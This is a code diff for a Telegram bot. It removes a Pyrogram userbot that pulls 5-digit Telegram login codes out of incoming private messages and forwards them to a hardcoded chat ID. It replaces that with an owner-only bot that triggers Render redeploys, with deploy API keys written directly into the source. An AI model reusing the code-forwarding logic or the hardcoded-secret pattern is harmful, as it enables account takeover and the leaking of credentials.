@@ -1,60 +1,96 @@
-from pyrogram import Client, filters, enums
-import re
-from os import getenv
+import os
+import httpx
+from pyrogram import Client, filters
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from dotenv import load_dotenv
 
-api_id = int(getenv("API_ID", 0))
-api_hash = getenv("API_HASH")
-session_string = getenv("SESSION")
+load_dotenv()
 
-media_filter = filters.document | filters.video
-SAVR_LOGIN = {}
+API_ID = int(os.getenv("API_ID"))
+API_HASH = os.getenv("API_HASH")
+BOT_TOKEN = os.getenv("BOT_TOKEN")
+OWNER_ID = int(os.getenv("OWNER_ID", "736279262"))
 
-Userbot = Client(
-  'user-bot',
-  api_id=api_id,
-  api_hash=api_hash,
-  session_string=session_string
-)
-  
+# ✅ Multiple Render Projects (each with its own Render API key)
+PROJECTS = {
+    "File Streamer": {
+        "service_id": "srv-cpuduhdjbks73efe7a0",
+        "api_key": "PkNRRjskswGAo",
+    },
+    "Video Host": {
+        "service_id": "srv-cxyz123abc456",
+        "api_key": "PHabc123xyz789",
+    },
+    "API Server": {
+        "service_id": "srv-c987def654ghi",
+        "api_key": "PH654xyz987pqr",
+    },
+    # ➕ Add more projects below
+}
 
-@Userbot.on_message(filters.command('start'))
-async def start(bot, update):
-    await update.reply("""
-When Telegram sends a login code (e.g. Login code: 24763),
-the bot automatically extracts the 5-digit code using regex.
+app = Client("multi_render_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
 
-2. The code is stored in memory inside SAVR_LOGIN["code"].
+# Function to trigger Render redeploy
+async def trigger_render_deploy(service_id: str, api_key: str) -> str:
+    url = f"https://api.render.com/deploy/{service_id}?key={api_key}"
+    async with httpx.AsyncClient(timeout=30) as client:
+        try:
+            r = await client.post(url)
+            if r.status_code in [200, 201, 202]:
+                return f"✅ Deploy started for `{service_id}` (HTTP {r.status_code})"
+            else:
+                return f"⚠️ Failed (HTTP {r.status_code})\nResponse: {r.text}"
+        except Exception as e:
+            return f"❌ Error: {e}"
 
-3. You can use /send anytime to get the formatted code (e.g., 2 4 7 6 3).
-    """)
+# /start
+@app.on_message(filters.command("start") & filters.user(OWNER_ID))
+async def start(_, msg):
+    await msg.reply_text(
+        "👋 Welcome! This bot can redeploy your multiple Render projects.\nUse /redeploy to view all."
+    )
 
-@Userbot.on_message(filters.command("send")) #, prefixes="!"))  # !send likhne par trigger hoga
-async def send_code(bot, update):
-    global SAVR_LOGIN
-    if "code" in SAVR_LOGIN:
-        code = SAVR_LOGIN["code"]
-        formatted = " ".join(code)  # 2 4 7 6 3
-        await update.reply(f"Here is the code {formatted}")
-    else:
-        await update.reply("❌ Abhi koi login code saved nahi hai.")
-  
+# /redeploy command → show all projects
+@app.on_message(filters.command("redeploy") & filters.user(OWNER_ID))
+async def redeploy_list(_, msg):
+    buttons = []
+    for name, info in PROJECTS.items():
+        buttons.append([
+            InlineKeyboardButton(f"🚀 {name}", callback_data=f"deploy:{name}")
+        ])
+    await msg.reply_text(
+        "Select a project to redeploy 👇",
+        reply_markup=InlineKeyboardMarkup(buttons)
+    )
 
-@Userbot.on_message(filters.private & filters.incoming)
-async def extract_code(client, message):
-    global SAVR_LOGIN
-    text = message.text or ""
+# Handle button press
+@app.on_callback_query(filters.user(OWNER_ID))
+async def deploy_button(_, query):
+    data = query.data
+    if not data.startswith("deploy:"):
+        await query.answer("Invalid data.", show_alert=True)
+        return
 
-    # Regex: 5-digit code find karega
-    match = re.search(r"\b\d{5}\b", text)
-    if match:
-        code = match.group(0)
-        SAVR_LOGIN["code"] = code
-    if "code" in SAVR_LOGIN:
-        code = SAVR_LOGIN["code"]
-        formatted = " ".join(code) 
-        await client.send_message(
-            text=f"Here is the code {formatted}",
-            chat_id = 5326801541
-        ) 
+    project_name = data.split(":", 1)[1]
+    project = PROJECTS.get(project_name)
 
-Userbot.run()
+    if not project:
+        await query.message.edit_text("❌ Unknown project.")
+        return
+
+    service_id = project["service_id"]
+    api_key = project["api_key"]
+
+    await query.message.edit_text(f"⏳ Redeploying *{project_name}* ...", parse_mode="markdown")
+
+    result = await trigger_render_deploy(service_id, api_key)
+    await query.message.edit_text(f"**{project_name}**\n{result}", parse_mode="markdown")
+
+# Block unauthorized users
+@app.on_message(~filters.user(OWNER_ID))
+async def unauthorized(_, msg):
+    await msg.reply_text("🚫 You are not authorized to use this bot.")
+
+if __name__ == "__main__":
+    print("🤖 Multi-account Render bot started!")
+    app.run()
